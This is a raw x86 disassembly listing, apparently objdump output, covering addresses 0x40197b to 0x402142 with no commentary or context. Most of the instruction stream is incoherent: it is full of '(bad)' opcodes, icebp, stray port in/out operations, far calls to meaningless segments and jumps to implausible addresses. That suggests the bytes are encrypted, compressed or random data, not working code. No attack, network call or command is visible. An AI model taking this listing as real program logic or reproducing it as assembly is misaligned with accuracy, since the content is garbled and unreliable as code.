  40197b:	shr    DWORD PTR [ebp+ebx*8-0x4f],0x33
  401980:	add    ah,BYTE PTR [esi+edx*1-0xb799eff]
  401987:	pop    ss
  401988:	mov    esp,DWORD PTR [esi+0x588b74a8]
  40198e:	fimul  WORD PTR gs:0x8f3a1cb
  401995:	clc    
  401996:	pusha  
  401997:	pop    edi
  401998:	and    eax,0x8e35bf65
  40199d:	ror    DWORD PTR [edi-0x2833da22],1
  4019a3:	jle    0x4019d5
  4019a5:	mov    edi,0x4ab54377
  4019aa:	xor    esi,DWORD PTR [esi+0x10]
  4019ad:	xchg   edi,eax
  4019ae:	retf   0xdafb
  4019b1:	and    bh,al
  4019b3:	ret    
  4019b4:	mov    dl,0x52
  4019b6:	aad    0x62
  4019b8:	fisubr DWORD PTR [ebx+0x20]
  4019bb:	inc    BYTE PTR [esi+ebx*8+0x64e123ea]
  4019c2:	ins    BYTE PTR es:[edi],dx
  4019c3:	and    al,0xbd
  4019c5:	mov    eax,0x4e917a25
  4019ca:	or     dh,BYTE PTR [edi]
  4019cc:	mov    dh,0xc0
  4019ce:	jno    0x401966
  4019d0:	pop    edi
  4019d1:	or     dl,dl
  4019d3:	pop    edi
  4019d4:	push   eax
  4019d5:	jns    0x401968
  4019d7:	mov    cl,0x4a
  4019d9:	and    eax,0x812e4cb0
  4019de:	push   ecx
  4019df:	sti    
  4019e0:	mov    dl,0xd3
  4019e2:	out    dx,al
  4019e3:	inc    esi
  4019e4:	ja     0x40196d
  4019e6:	leave  
  4019e7:	inc    ecx
  4019e8:	sbb    dl,BYTE PTR [ebp-0x6ea9ef66]
  4019ee:	js     0x401a0d
  4019f0:	or     eax,0x5caf1f19
  4019f5:	xlat   BYTE PTR ds:[ebx]
  4019f6:	ins    BYTE PTR es:[edi],dx
  4019f7:	dec    BYTE PTR [edx]
  4019f9:	jb     0x4019ef
  4019fb:	loope  0x4019f3
  4019fd:	jmp    0x401a7b
  4019ff:	call   0x88e:0xf1babf9
  401a06:	inc    edi
  401a07:	xchg   edi,eax
  401a08:	scas   eax,DWORD PTR es:[edi]
  401a09:	sub    al,BYTE PTR [ebx+edx*2]
  401a0c:	into   
  401a0d:	inc    ecx
  401a0e:	pop    ebp
  401a0f:	pushf  
  401a10:	jnp    0x4019fc
  401a12:	es addr16 push 0xf45dbd1e
  401a19:	and    eax,DWORD PTR [edx-0x5c]
  401a1c:	sbb    DWORD PTR [ebx+0x38],ecx
  401a1f:	(bad)
  401a22:	scas   al,BYTE PTR es:[edi]
  401a23:	push   ds
  401a24:	push   cs
  401a25:	fistp  DWORD PTR [ecx]
  401a27:	pop    ebp
  401a28:	rcl    DWORD PTR [ebp-0x530aa122],cl
  401a2e:	rcr    BYTE PTR [eax+0x31],1
  401a31:	sub    eax,0xba943ced
  401a36:	retf   0xa909
  401a39:	jae    0x401a9a
  401a3b:	ja     0x401a5a
  401a3d:	dec    ebp
  401a3e:	mov    cl,0xb3
  401a40:	ror    DWORD PTR [esi+0x2f],1
  401a43:	or     ah,ah
  401a45:	ja     0x401ab2
  401a47:	das    
  401a48:	or     al,0xf9
  401a4a:	xor    DWORD PTR [ebx+0x6ff3087e],ecx
  401a50:	push   ss
  401a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a52:	dec    edi
  401a53:	xor    al,0xf8
  401a55:	retf   0xd83
  401a58:	clc    
  401a59:	and    BYTE PTR [eax-0x69],0xaa
  401a5d:	rcr    esi,0x9a
  401a60:	sahf   
  401a61:	das    
  401a62:	arpl   WORD PTR [ecx+0x34],si
  401a65:	repnz xchg edx,eax
  401a67:	jmp    0x4fc4f877
  401a6c:	xor    al,0x69
  401a6e:	fldcw  WORD PTR [ecx-0x1456683]
  401a74:	mov    esi,0x45ad51e6
  401a79:	xchg   ecx,eax
  401a7a:	repz clc 
  401a7c:	fild   DWORD PTR [edx-0x6ebe4128]
  401a82:	mov    esi,0x5378ffd7
  401a87:	fcomp  st(1)
  401a89:	push   ds
  401a8a:	and    dh,al
  401a8c:	pop    ds
  401a8d:	mov    edi,0x7942b112
  401a92:	dec    edi
  401a93:	int3   
  401a94:	pandn  mm5,QWORD PTR [edx]
  401a97:	cmp    eax,0xcb5ededd
  401a9c:	sub    BYTE PTR [ebp+ebp*1+0x6f],ah
  401aa0:	bound  esp,QWORD PTR [edi]
  401aa2:	bndldx (bad),[ecx]
  401aa5:	jge    0x401a42
  401aa7:	dec    esp
  401aa8:	inc    DWORD PTR fs:0xd38340a6
  401aaf:	test   DWORD PTR [ecx+0x1],esi
  401ab2:	jp     0x401acc
  401ab4:	into   
  401ab5:	inc    edx
  401ab6:	lahf   
  401ab7:	cmp    eax,0x41cc1d0d
  401abc:	addr16 (bad) 
  401abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401abf:	mov    edx,0x80f7193
  401ac4:	cmp    edi,DWORD PTR [ecx]
  401ac6:	sahf   
  401ac7:	fsub   QWORD PTR [edx+0x6]
  401aca:	add    eax,DWORD PTR ds:0x53b4d2b2
  401ad0:	test   eax,0x6558fd41
  401ad5:	mov    bl,0xee
  401ad7:	leave  
  401ad8:	pop    ds
  401ad9:	xor    al,0x73
  401adb:	and    BYTE PTR [edi],dl
  401add:	inc    bl
  401adf:	adc    bh,BYTE PTR [ebx-0x6f]
  401ae2:	sbb    BYTE PTR [edi],bl
  401ae4:	arpl   WORD PTR [ecx+0x3439f4a0],ax
  401aea:	pop    edi
  401aeb:	xchg   edx,eax
  401aec:	xchg   edx,eax
  401aed:	cmp    esp,DWORD PTR [ebx-0xa]
  401af0:	cwde   
  401af1:	std    
  401af2:	ror    DWORD PTR [edi],0xea
  401af5:	je     0x401b76
  401af7:	outs   dx,DWORD PTR ds:[esi]
  401af8:	mov    esi,DWORD PTR [eax]
  401afa:	sbb    esi,DWORD PTR [edx+ecx*4]
  401afd:	dec    ebx
  401afe:	xchg   ebp,eax
  401aff:	add    BYTE PTR [esi],dh
  401b01:	ret    0x25c2
  401b04:	and    DWORD PTR [edx+0x68],edi
  401b07:	mov    ebx,0x27552b80
  401b0c:	push   edi
  401b0d:	cwde   
  401b0e:	push   esi
  401b0f:	mov    ebp,0xfb2ad0cf
  401b14:	fwait
  401b15:	dec    esi
  401b16:	cmp    al,0x24
  401b18:	cdq    
  401b19:	push   esp
  401b1a:	mov    ecx,0x3e080979
  401b1f:	in     eax,dx
  401b20:	push   ebp
  401b21:	(bad)  
  401b22:	cwde   
  401b23:	xchg   ecx,eax
  401b24:	jo     0x401b62
  401b26:	inc    edx
  401b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b28:	fwait
  401b29:	mov    edx,0x866f3dd
  401b2e:	inc    DWORD PTR [edx]
  401b30:	jmp    0x401b8b
  401b32:	shr    DWORD PTR [edi+eiz*2-0x2ae38586],cl
  401b39:	or     al,0x24
  401b3b:	jae    0x401ace
  401b3d:	mov    eax,ds:0x5f0e8c04
  401b42:	mov    BYTE PTR [esp+ebp*2+0x10edd59a],ah
  401b49:	mov    bh,0x2d
  401b4b:	or     ebp,DWORD PTR [edi+esi*1]
  401b4e:	fidivr WORD PTR [ebx]
  401b50:	or     al,0x22
  401b52:	(bad)  
  401b53:	push   ss
  401b54:	and    BYTE PTR [edi],bl
  401b56:	std    
  401b57:	data16 cli 
  401b59:	in     al,0xf3
  401b5b:	and    dh,ch
  401b5d:	jno    0x401bc9
  401b5f:	pusha  
  401b60:	jnp    0x401b6a
  401b62:	or     ch,dh
  401b64:	stos   BYTE PTR es:[edi],al
  401b65:	push   edx
  401b66:	cmp    ah,BYTE PTR [ebp+0x21f9a5a6]
  401b6c:	inc    ecx
  401b6d:	dec    edx
  401b6e:	inc    ebp
  401b6f:	mov    edi,0x39cb9013
  401b74:	dec    edx
  401b75:	aas    
  401b76:	aaa    
  401b77:	arpl   WORD PTR [ecx+edi*2],cx
  401b7a:	and    DWORD PTR [eax-0x29],esi
  401b7d:	retf   
  401b7e:	mov    ebp,0xefb578eb
  401b83:	lds    esi,FWORD PTR [esi]
  401b85:	xor    al,0xe7
  401b87:	sbb    edi,esi
  401b89:	jle    0x401b74
  401b8b:	out    dx,eax
  401b8c:	(bad)  
  401b8d:	push   0x579af775
  401b92:	rol    BYTE PTR gs:[ecx],cl
  401b95:	in     al,0x99
  401b97:	pushf  
  401b98:	or     al,0x59
  401b9a:	xor    eax,0x7050b8a
  401b9f:	add    cl,BYTE PTR [ecx+eiz*1-0x710bb7dc]
  401ba6:	idiv   esi
  401ba8:	and    BYTE PTR [edi+0x10446db],dh
  401bae:	xchg   edx,eax
  401baf:	stc    
  401bb0:	mov    bl,BYTE PTR [ebp-0x7b654343]
  401bb6:	in     al,dx
  401bb7:	push   ecx
  401bb8:	es (bad) 
  401bba:	pop    ebx
  401bbb:	ror    DWORD PTR [edx-0x4866d0cc],1
  401bc1:	pop    ss
  401bc2:	xchg   esp,eax
  401bc3:	dec    ebp
  401bc4:	xchg   edx,eax
  401bc5:	out    dx,al
  401bc6:	sub    al,0x8
  401bc8:	loope  0x401bc8
  401bca:	adc    al,BYTE PTR [edi-0x5e]
  401bcd:	imul   esi,DWORD PTR [esp+esi*1],0xadc981ba
  401bd4:	dec    eax
  401bd5:	sub    al,0xd4
  401bd7:	push   eax
  401bd8:	sub    eax,DWORD PTR [edi-0x2f]
  401bdb:	inc    ebp
  401bdc:	je     0x401bfa
  401bde:	lds    ecx,FWORD PTR [ecx+0x6cf7e496]
  401be4:	pop    esp
  401be5:	fwait
  401be6:	mov    cl,0x9
  401be8:	cmp    dl,ch
  401bea:	sbb    eax,esi
  401bec:	shl    ah,0x4a
  401bef:	ret    
  401bf0:	rcl    BYTE PTR [eax+0x4730618],cl
  401bf6:	lock push edx
  401bf8:	popf   
  401bf9:	push   ecx
  401bfa:	and    ebp,DWORD PTR [esi+esi*2]
  401bfd:	aam    0x2b
  401bff:	lock pop edi
  401c01:	mov    eax,ds:0x3cb4b890
  401c06:	outs   dx,DWORD PTR ds:[esi]
  401c07:	mov    dh,0x2e
  401c09:	les    eax,FWORD PTR [ecx-0x699d6f76]
  401c0f:	lea    ebx,[ebp-0x29]
  401c12:	repz jbe 0x401baf
  401c15:	push   0x6c
  401c17:	mov    ebp,0xbec967cc
  401c1c:	mov    edx,0x73c3b7cc
  401c21:	mov    ah,0x86
  401c23:	or     BYTE PTR [esi-0x81ac7aa],al
  401c29:	psubq  mm0,QWORD PTR [edx+0x2b]
  401c2d:	test   ebp,ebx
  401c2f:	push   esi
  401c30:	xchg   BYTE PTR [ecx],dl
  401c32:	stc    
  401c33:	xchg   BYTE PTR [edx+0x33],cl
  401c36:	leave  
  401c37:	add    BYTE PTR [ecx+0x5841d600],bh
  401c3d:	js     0x401bd1
  401c3f:	mov    ecx,0xa219e856
  401c44:	stos   DWORD PTR es:[edi],eax
  401c45:	test   al,0xfd
  401c47:	xor    BYTE PTR [edi],al
  401c49:	adc    al,cl
  401c4b:	test   eax,0xe40adb4e
  401c50:	push   0xc980f222
  401c55:	or     al,0x8b
  401c57:	repz dec esi
  401c59:	enter  0xf2ce,0x2a
  401c5d:	xchg   BYTE PTR [esi-0x15],bl
  401c60:	stos   BYTE PTR es:[edi],al
  401c61:	push   eax
  401c62:	(bad)  
  401c63:	data16 xor al,BYTE PTR [ebx]
  401c66:	dec    esi
  401c67:	cmp    dl,bl
  401c69:	mov    al,0x97
  401c6b:	mov    ebx,0xdedf784a
  401c70:	rcr    edx,1
  401c72:	leave  
  401c73:	inc    ebp
  401c74:	xor    eax,0x9b0c1f60
  401c79:	mov    ecx,0xba97e4cb
  401c7e:	jmp    0x4beffba1
  401c83:	lea    esp,[eax-0x7b]
  401c86:	add    cl,bl
  401c88:	and    al,0x89
  401c8a:	outs   dx,BYTE PTR ds:[esi]
  401c8b:	aad    0xf3
  401c8d:	add    BYTE PTR ds:0xfb9b22af,bh
  401c93:	mov    edx,DWORD PTR [ecx+0x2f]
  401c96:	sub    BYTE PTR [ebp+0x6],dh
  401c99:	push   0x5e8d627b
  401c9e:	or     al,0x6f
  401ca0:	mov    cs,ebp
  401ca2:	daa    
  401ca3:	xchg   esp,eax
  401ca4:	in     eax,dx
  401ca5:	mov    cl,0x9d
  401ca7:	adc    ebx,ecx
  401ca9:	cld    
  401caa:	push   ss
  401cab:	in     eax,dx
  401cac:	out    dx,eax
  401cad:	cmp    DWORD PTR [ecx+0x45],esi
  401cb0:	pop    ebp
  401cb1:	pop    eax
  401cb2:	mov    ebp,DWORD PTR [ebp+0x2190db51]
  401cb8:	jp     0x401d0b
  401cba:	inc    ecx
  401cbb:	shr    DWORD PTR ds:0x8fe911c4,0xd9
  401cc2:	(bad)  
  401cc3:	cmc    
  401cc4:	adc    eax,0xfdbfdec9
  401cc9:	pop    esp
  401cca:	jne    0x401cf6
  401ccc:	add    DWORD PTR [esi+0x26811714],eax
  401cd2:	dec    BYTE PTR [eax+esi*1]
  401cd5:	ret    0x4632
  401cd8:	in     eax,0x3a
  401cda:	xor    ecx,ebp
  401cdc:	add    DWORD PTR [ebp+edi*1+0x12],0x159fa885
  401ce4:	rol    BYTE PTR [edi],1
  401ce6:	or     eax,0x8d1761e4
  401ceb:	lds    ebx,FWORD PTR gs:[eax]
  401cee:	cmp    eax,0xc8a5c030
  401cf3:	sbb    al,0x13
  401cf5:	mov    eax,0xc81bda06
  401cfa:	mov    al,0xb6
  401cfc:	fimul  DWORD PTR [esi-0xb]
  401cff:	jns    0x401cfc
  401d01:	or     al,BYTE PTR [ebp-0x40]
  401d04:	push   ecx
  401d05:	icebp  
  401d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d08:	add    eax,0x1d8d2eab
  401d0d:	dec    edi
  401d0e:	daa    
  401d0f:	mov    ebx,0x1ad7eb0c
  401d14:	repnz imul BYTE PTR [edi]
  401d17:	sbb    DWORD PTR [esi],edx
  401d19:	push   cs
  401d1a:	xor    DWORD PTR [eax],edx
  401d1c:	test   eax,0x55632914
  401d21:	adc    al,0x80
  401d23:	push   ecx
  401d24:	inc    esp
  401d25:	mov    BYTE PTR [edi-0x40b644bc],bl
  401d2b:	jge    0x401cbe
  401d2d:	daa    
  401d2e:	rcl    DWORD PTR [ecx],cl
  401d30:	dec    eax
  401d31:	fstp   st(3)
  401d33:	mov    al,ds:0x4205d578
  401d38:	call   0xbb7689bb
  401d3d:	dec    ecx
  401d3e:	or     eax,0xd3a5404a
  401d43:	xchg   ebx,eax
  401d44:	inc    edi
  401d45:	add    ch,BYTE PTR [eax-0x638d60ea]
  401d4b:	xor    eax,DWORD PTR [eax-0xf]
  401d4e:	js     0x401d85
  401d50:	xchg   edx,eax
  401d51:	loop   0x401d73
  401d53:	sub    eax,edx
  401d55:	shr    DWORD PTR [edx+edx*8+0x7ae19256],0xf9
  401d5d:	mov    al,ds:0x12219868
  401d62:	daa    
  401d63:	scas   al,BYTE PTR es:[edi]
  401d64:	lock sbb bh,cl
  401d67:	pop    eax
  401d68:	dec    ebx
  401d69:	das    
  401d6a:	cmp    edi,eax
  401d6c:	xchg   BYTE PTR [ecx-0x54b60cb8],dh
  401d72:	mov    eax,0x91894885
  401d77:	(bad)  [eax]
  401d79:	mov    ds:0x3520845d,al
  401d7e:	gs pop esp
  401d80:	fld    TBYTE PTR [esi-0x4e30f76a]
  401d86:	shr    bl,1
  401d88:	in     al,0x6a
  401d8a:	sub    DWORD PTR [ebx+0x6d],0x75
  401d8e:	repz push 0xffffffb8
  401d91:	scas   eax,DWORD PTR es:[edi]
  401d92:	pop    eax
  401d93:	mov    edx,DWORD PTR [eax]
  401d95:	(bad)  
  401d96:	sbb    al,0x11
  401d98:	test   DWORD PTR [eax+0x6d],edi
  401d9b:	xor    BYTE PTR [esi-0x3c],0x1c
  401d9f:	pop    ebx
  401da0:	rcl    bh,0xe4
  401da3:	es (bad) 
  401da5:	jmp    0x401d87
  401da7:	daa    
  401da8:	mov    ds:0x5f7ee2cb,al
  401dad:	jmp    0x401de7
  401daf:	and    DWORD PTR [eax],0xf8e2393e
  401db5:	imul   ebx,edi,0xffffffe0
  401db8:	push   eax
  401db9:	cli    
  401dba:	mov    esp,0x433103ee
  401dbf:	sbb    BYTE PTR [eax+0x12],bh
  401dc2:	(bad)  
  401dc3:	or     al,0xee
  401dc5:	cmp    BYTE PTR [eax-0xb],0xec
  401dc9:	shl    al,1
  401dcb:	sbb    DWORD PTR [eax+0x22518271],eax
  401dd1:	call   0xf7c1:0xc5d2954b
  401dd8:	xor    esi,DWORD PTR [edi-0x71]
  401ddb:	push   edi
  401ddc:	mov    eax,ds:0x3652e99c
  401de1:	nop
  401de2:	popf   
  401de3:	mov    ebx,0x6bc42a12
  401de8:	xchg   ebp,eax
  401de9:	cdq    
  401dea:	stos   WORD PTR es:[edi],ax
  401dec:	mov    ebp,0x7bc6ce0b
  401df1:	bound  esi,QWORD PTR [ebp-0x2bc1f17a]
  401df7:	cld    
  401df8:	adc    al,0xcc
  401dfa:	or     edi,DWORD PTR [eax-0x237a5e5f]
  401e00:	lods   al,BYTE PTR ds:[esi]
  401e01:	mov    DWORD PTR [eax+0x28],edx
  401e04:	sbb    BYTE PTR [edi+0x67],cl
  401e07:	fdivr  st(4),st
  401e09:	popf   
  401e0a:	mov    dh,0x63
  401e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e0d:	xchg   ebx,eax
  401e0e:	ja     0x401e31
  401e10:	xchg   ebx,eax
  401e11:	jno    0x401e45
  401e13:	popa   
  401e14:	pusha  
  401e15:	and    ch,ah
  401e17:	cmp    al,0xe0
  401e19:	and    DWORD PTR [ebx-0x418682d5],0xfffffffc
  401e20:	jne    0x401e55
  401e22:	or     edx,DWORD PTR [esp+esi*4-0xdfbdb07]
  401e29:	dec    edx
  401e2a:	aam    0xe4
  401e2c:	in     eax,dx
  401e2d:	ds (bad) 
  401e2f:	es xchg eax,edx
  401e32:	je     0x401e58
  401e34:	and    ch,BYTE PTR [edx+0x5e]
  401e37:	sbb    al,0xf0
  401e39:	sub    eax,0x4913e600
  401e3e:	jge    0x401dff
  401e40:	xchg   edx,eax
  401e41:	cld    
  401e42:	fucomip st,st(3)
  401e44:	sbb    eax,0x11
  401e47:	or     esp,eax
  401e49:	xchg   BYTE PTR [esi-0x3de3ee1f],dh
  401e4f:	xor    DWORD PTR [eax+0x2ee020da],eax
  401e55:	mov    eax,0x43eee8ee
  401e5a:	inc    edi
  401e5b:	pusha  
  401e5c:	cdq    
  401e5d:	mov    edi,0xe08ef0
  401e62:	shl    BYTE PTR [ecx+0x429780d7],1
  401e68:	daa    
  401e69:	clc    
  401e6a:	and    BYTE PTR [edx-0x6119dbad],bh
  401e70:	ds jle 0x401ed4
  401e73:	icebp  
  401e74:	adc    al,0xd3
  401e76:	xor    esp,DWORD PTR [esi+ebp*1]
  401e79:	stc    
  401e7a:	and    BYTE PTR [ebx],dl
  401e7c:	xchg   ebp,eax
  401e7d:	dec    esi
  401e7e:	lods   eax,DWORD PTR ds:[esi]
  401e7f:	hlt    
  401e80:	retf   
  401e81:	stc    
  401e82:	repz sbb esi,DWORD PTR [ecx+edx*1]
  401e86:	das    
  401e87:	fbstp  TBYTE PTR [edi+edx*4-0x50]
  401e8b:	sbb    edi,DWORD PTR [ecx+0x4e]
  401e8e:	push   ecx
  401e8f:	lea    esi,[edx+eiz*1-0x4b]
  401e93:	(bad)  
  401e94:	int    0x76
  401e96:	call   0xda05ac7b
  401e9b:	dec    edi
  401e9c:	and    BYTE PTR [ebp+0x4883d644],ah
  401ea2:	mov    esi,0x86b66792
  401ea7:	aas    
  401ea8:	inc    esi
  401ea9:	pop    es
  401eaa:	arpl   WORD PTR ds:0x2cb1bc9f,si
  401eb0:	test   eax,0x209d2379
  401eb5:	aas    
  401eb6:	xor    DWORD PTR [ecx+0x769722d0],0x3f
  401ebd:	and    al,0x99
  401ebf:	jnp    0x401f0b
  401ec1:	inc    esp
  401ec2:	push   esp
  401ec3:	push   ebp
  401ec4:	push   0x9e3a5d00
  401ec9:	jge    0x401ef8
  401ecb:	cli    
  401ecc:	pushf  
  401ecd:	pop    ecx
  401ece:	mov    ds:0xb845fe0a,eax
  401ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ed4:	inc    ecx
  401ed5:	mov    esi,0xfded1fd1
  401eda:	xchg   esi,eax
  401edb:	out    0x11,al
  401edd:	lods   eax,DWORD PTR ds:[esi]
  401ede:	sub    DWORD PTR [ebp-0x7e],ebp
  401ee1:	(bad)  
  401ee2:	fnstsw WORD PTR [ecx-0x3d4e3119]
  401ee8:	add    bl,ch
  401eea:	pcmpeqd mm2,mm4
  401eed:	shl    ah,0x70
  401ef0:	test   eax,0x67f80c2c
  401ef5:	jp     0x401f2e
  401ef7:	cwde   
  401ef8:	les    eax,FWORD PTR [ecx]
  401efa:	stos   DWORD PTR es:[edi],eax
  401efb:	push   es
  401efc:	push   ds
  401efd:	aas    
  401efe:	sbb    BYTE PTR [esi-0x12],bh
  401f01:	imul   ecx,DWORD PTR [edx+0x6f7e221],0xc7d72bed
  401f0b:	push   ebx
  401f0c:	pop    ebx
  401f0d:	dec    eax
  401f0e:	or     eax,0x6495f624
  401f13:	add    DWORD PTR [edx+edi*8],ebx
  401f16:	mov    ss:0xe763ba96,eax
  401f1c:	leave  
  401f1d:	and    DWORD PTR [edi-0x3c],edx
  401f20:	push   cs
  401f21:	es push ebp
  401f23:	pop    esp
  401f24:	imul   edi,DWORD PTR [ebx+0x16],0x18
  401f28:	and    eax,0x501c139b
  401f2d:	(bad)  
  401f2e:	mov    bl,0x29
  401f30:	xchg   edi,eax
  401f31:	pop    ds
  401f32:	repz test esp,0xb36c989e
  401f39:	lds    ebx,FWORD PTR [edi-0x61]
  401f3c:	ret    
  401f3d:	mov    ebp,0x9c744140
  401f42:	mov    al,ds:0x847b4e10
  401f47:	out    0xa3,eax
  401f49:	sahf   
  401f4a:	mov    ebp,0x88a6127f
  401f4f:	(bad)  
  401f50:	adc    BYTE PTR [edi-0x5286ee35],bh
  401f56:	into   
  401f57:	pop    esp
  401f58:	ins    DWORD PTR es:[edi],dx
  401f59:	inc    ebx
  401f5a:	mov    ah,0xa3
  401f5c:	cmp    BYTE PTR [edx+0x6e],dl
  401f5f:	adc    DWORD PTR [ebp-0x3a],esi
  401f62:	mov    ah,0x56
  401f64:	pop    ds
  401f65:	pop    edx
  401f66:	in     al,0x25
  401f68:	sub    BYTE PTR [ebx-0x2b],0xcc
  401f6c:	push   esp
  401f6d:	sbb    eax,0xb650bd1c
  401f72:	fist   WORD PTR [ecx+0x6ccc6dd3]
  401f78:	icebp  
  401f79:	das    
  401f7a:	add    dl,BYTE PTR [esi+ebx*8]
  401f7d:	(bad)  
  401f7e:	jnp    0x401f0d
  401f80:	inc    edi
  401f81:	outs   dx,BYTE PTR ds:[esi]
  401f82:	ret    0xf827
  401f85:	ss dec ebx
  401f87:	jno    0x401fdd
  401f89:	xchg   ebp,eax
  401f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f8b:	xor    DWORD PTR [ebx+0x2599113a],0xd8a9e3ca
  401f95:	mov    DWORD PTR [ebp+0x28],edx
  401f98:	jle    0x40200b
  401f9a:	push   ebp
  401f9b:	and    eax,0x1afd47e3
  401fa0:	push   esi
  401fa1:	and    eax,DWORD PTR [ecx-0x51]
  401fa4:	push   edi
  401fa5:	pop    ecx
  401fa6:	mov    edi,0xf16ba355
  401fab:	xchg   esp,eax
  401fac:	cmc    
  401fad:	loop   0x401fe6
  401faf:	inc    edi
  401fb0:	popa   
  401fb1:	push   esp
  401fb2:	jo     0x401f79
  401fb4:	adc    eax,0x2600c7fa
  401fb9:	loope  0x401fd4
  401fbb:	and    ah,BYTE PTR [eax+0x6404116c]
  401fc1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc3:	sbb    DWORD PTR cs:[esi-0x6c],0x60
  401fc8:	xchg   esi,eax
  401fc9:	jge    0x401fb3
  401fcb:	test   DWORD PTR [ecx+0x53cf4387],ebx
  401fd1:	sbb    ch,dl
  401fd3:	or     bl,BYTE PTR [esi+0x3]
  401fd6:	or     eax,0xd5ef04f
  401fdb:	pushf  
  401fdc:	hlt    
  401fdd:	fs js  0x401f6a
  401fe0:	inc    eax
  401fe1:	je     0x402015
  401fe3:	xchg   ebp,eax
  401fe4:	pop    esp
  401fe5:	inc    ebx
  401fe6:	retf   0xa31b
  401fe9:	pop    edx
  401fea:	aam    0xc8
  401fec:	jae    0x401f83
  401fee:	dec    edi
  401fef:	pop    edi
  401ff0:	dec    esi
  401ff1:	leave  
  401ff2:	mov    DWORD PTR [ebx-0x5395a1b2],esp
  401ff8:	jnp    0x401fcc
  401ffa:	cmp    edi,DWORD PTR [ecx+0x7fecd3fd]
  402000:	mov    dl,cl
  402002:	xchg   BYTE PTR [edx],bh
  402004:	lock or al,0x77
  402007:	fld    QWORD PTR [esp+edx*2]
  40200a:	stc    
  40200b:	mov    esi,0xddb56016
  402010:	(bad)  [edx]
  402012:	stos   BYTE PTR es:[edi],al
  402013:	cmp    ebp,DWORD PTR [edx]
  402015:	jae    0x401fe6
  402017:	push   edi
  402018:	jle    0x402090
  40201a:	lock mov al,BYTE PTR [ebp-0x5a01b6d4]
  402021:	stos   DWORD PTR es:[edi],eax
  402022:	jne    0x402078
  402024:	test   BYTE PTR [eax],dh
  402026:	xchg   edi,eax
  402027:	jbe    0x402081
  402029:	mov    bl,0xd4
  40202b:	fwait
  40202c:	sbb    DWORD PTR [edi],esp
  40202e:	outs   dx,DWORD PTR ds:[esi]
  40202f:	(bad)  
  402030:	or     eax,0x6a0a148f
  402035:	or     ch,dh
  402037:	daa    
  402038:	dec    ecx
  402039:	out    0xaa,eax
  40203b:	xchg   ecx,eax
  40203c:	shl    DWORD PTR [edx+0x42],0xc7
  402040:	in     al,dx
  402041:	pusha  
  402042:	pop    edi
  402043:	inc    ebx
  402044:	ror    ch,0x57
  402047:	call   0x9e473a7b
  40204c:	sub    eax,0x8871c19a
  402051:	mov    BYTE PTR [esi],bl
  402053:	inc    ecx
  402054:	xchg   edi,eax
  402055:	pushf  
  402056:	in     al,dx
  402057:	stos   DWORD PTR es:[edi],eax
  402058:	mov    eax,0x7fe20198
  40205d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40205e:	adc    edx,esp
  402060:	xor    esp,DWORD PTR [edi+0x4f9e8700]
  402066:	pop    eax
  402067:	and    eax,0x828bf1f9
  40206c:	idiv   BYTE PTR [edx-0x4e3fc289]
  402072:	and    DWORD PTR [ebp-0x7be33036],ebp
  402078:	js     0x402079
  40207a:	sahf   
  40207b:	test   DWORD PTR [eax-0x37],0xc125f561
  402082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402083:	test   BYTE PTR [ebx],ch
  402085:	pop    eax
  402086:	sub    eax,0x5a4b0a1
  40208b:	addr16 aad 0xf3
  40208e:	jmp    0xd55145ac
  402093:	dec    esp
  402094:	xchg   edi,eax
  402095:	or     al,0x1e
  402097:	mov    cl,0xd2
  402099:	lods   al,BYTE PTR ds:[esi]
  40209a:	push   0x44fa35c1
  40209f:	popf   
  4020a0:	cmp    BYTE PTR [edi+0x2963b28d],dh
  4020a6:	rol    DWORD PTR [eax],cl
  4020a8:	inc    eax
  4020a9:	popa   
  4020aa:	lods   eax,DWORD PTR ds:[esi]
  4020ab:	ret    0xc044
  4020ae:	mov    ecx,DWORD PTR [ecx-0x2f0a6852]
  4020b4:	cmp    bl,BYTE PTR [ecx]
  4020b6:	add    BYTE PTR [esp+eiz*4+0x8],ch
  4020ba:	ss scas al,BYTE PTR es:[edi]
  4020bc:	dec    esp
  4020bd:	sbb    al,0xc0
  4020bf:	mov    ?,ebx
  4020c1:	sub    eax,0xbd6759db
  4020c6:	daa    
  4020c7:	jmp    0x9e27:0xba31e1cb
  4020ce:	pop    ds
  4020cf:	stc    
  4020d0:	jl     0x4020ee
  4020d2:	js     0x40214f
  4020d4:	int    0xeb
  4020d6:	mov    ds:0x1b489e61,al
  4020db:	mov    ds:0x128cec1,al
  4020e0:	in     al,dx
  4020e1:	or     al,0x2
  4020e3:	inc    ebp
  4020e4:	xchg   esi,eax
  4020e5:	popa   
  4020e6:	int    0x88
  4020e8:	xchg   esi,eax
  4020e9:	loop   0x402120
  4020eb:	popf   
  4020ec:	pop    ebx
  4020ed:	mov    ds:0x44e34024,ax
  4020f3:	mov    edx,0xee988e65
  4020f8:	add    al,0x87
  4020fa:	dec    ecx
  4020fb:	ja     0x40213d
  4020fd:	pusha  
  4020fe:	mov    bh,cl
  402100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402101:	retf   0xa780
  402104:	stos   DWORD PTR es:[edi],eax
  402105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402106:	cdq    
  402107:	test   BYTE PTR [esi+0x61],ch
  40210a:	shl    DWORD PTR [ebp+0x3d],0xc7
  40210e:	dec    eax
  40210f:	fcomp  st(3)
  402111:	jb     0x402124
  402113:	sub    DWORD PTR [ecx+ebp*4+0x71fcd950],esi
  40211a:	out    0x46,al
  40211c:	(bad)  
  40211d:	(bad)  
  40211e:	call   0xf70c:0x43235c71
  402125:	push   ebx
  402126:	inc    ebx
  402127:	pushf  
  402128:	ror    ch,0x52
  40212b:	push   cs
  40212c:	xchg   edx,eax
  40212d:	ret    
  40212e:	or     al,0xe9
  402130:	mov    edx,0xe2ca27d1
  402135:	mov    al,0x5c
  402137:	add    ecx,esp
  402139:	inc    eax
  40213a:	retf   0x9461
  40213d:	movups XMMWORD PTR [esi],xmm2
  402140:	js     0x40214d
  402142:	iret   
